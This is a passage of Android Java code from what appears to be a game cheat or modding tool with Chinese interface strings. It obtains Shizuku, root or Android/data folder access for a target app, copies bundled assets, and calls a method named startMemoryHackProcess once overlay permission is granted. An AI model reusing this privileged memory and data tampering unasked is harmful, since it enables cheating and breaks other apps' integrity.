            if (layoutPermissionContainer.getVisibility() != View.GONE) {
                layoutPermissionContainer.setVisibility(View.GONE);
                layoutActionContainer.setVisibility(View.VISIBLE);
                layoutActionContainer.setAlpha(0f);
                layoutActionContainer.animate().alpha(1f).setDuration(500).start();
            }
            permissionStatus.setText("已授权");
            permissionStatus.setTextColor(Color.GREEN);
        } else {
            layoutPermissionContainer.setVisibility(View.VISIBLE);
            layoutActionContainer.setVisibility(View.GONE);
            permissionStatus.setText("未授权");
            permissionStatus.setTextColor(Color.RED);
        }
    }

    private void checkHasPermission() {
        boolean shizukuOk = false;
        try { if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) shizukuOk = true; } catch (Throwable t) {}
        if (shizukuOk || new RootBeer(this).isRooted()) {
            updatePermissionStatus(true);
            return;
        }
        String uriStr = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getString(DATA_URI_KEY, null);
        if (uriStr != null) {
            try {
                if (DocumentFile.fromTreeUri(this, Uri.parse(uriStr)).canRead()) {
                    updatePermissionStatus(true);
                    return;
                }
            } catch (Exception e) {}
        }
        updatePermissionStatus(false);
    }

    private void copyAssetsToExternalFilesDir() {
        if (getSharedPreferences(PREFS_NAME, MODE_PRIVATE).getBoolean(PREF_ASSETS_COPIED, false)) return;
        File targetDir = getExternalFilesDir(null);
        if (!targetDir.exists()) targetDir.mkdirs();
        try {
            String[] files = getAssets().list("");
            if (files != null) {
                for (String f : files) {
                    try (InputStream in = getAssets().open(f); OutputStream out = new FileOutputStream(new File(targetDir, f))) {
                        byte[] buf = new byte[1024]; int len; while ((len = in.read(buf)) != -1) out.write(buf, 0, len);
                    } catch (IOException ignored) {}
                }
            }
        } catch (IOException ignored) {}
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putBoolean(PREF_ASSETS_COPIED, true).apply();
    }

    private void openDataDirectory() {
        Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            intent.putExtra(DocumentsContract.EXTRA_INITIAL_URI, DocumentsContract.buildDocumentUri("com.android.externalstorage.documents", "primary:Android/data"));
        Toast.makeText(this, "请授权 " + TARGET_PKG + " 目录", Toast.LENGTH_LONG).show();
        openDirectoryLauncher.launch(intent);
    }

    private void handleShizuku() {
        try {
            if (!Shizuku.pingBinder()) { Toast.makeText(this, "Shizuku 未运行", Toast.LENGTH_SHORT).show(); return; }
            if (Shizuku.checkSelfPermission() != PackageManager.PERMISSION_GRANTED) Shizuku.requestPermission(REQUEST_CODE_SHIZUKU_PERMISSION);
        } catch (Throwable t) { Toast.makeText(this, "Shizuku 异常", Toast.LENGTH_SHORT).show(); }
    }

    private void handleRoot() { checkHasPermission(); }
    private void onRequestPermissionsResult(int c, int r) { if (c == REQUEST_CODE_SHIZUKU_PERMISSION) checkHasPermission(); }
    private int dpToPx(int dp) { return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, getResources().getDisplayMetrics()); }

    private void showImagePopup(FunctionConfig config) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        ImageView imageView = new ImageView(this);
        imageView.setImageResource(config.imageResId);
        imageView.setAdjustViewBounds(true);
        imageView.setPadding(20, 20, 20, 20);
        imageView.setBackgroundColor(Color.WHITE);
        builder.setView(imageView);
        AlertDialog dialog = builder.create();
        if (dialog.getWindow() != null) dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.show();
    }

    @Override protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_FLOAT_WINDOW) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) startMemoryHackProcess();
        }
    }

    @Override protected void onDestroy() {
        super.onDestroy();
        try { Shizuku.removeRequestPermissionResultListener(requestPermissionResultListener); } catch(Throwable t){}
    }
}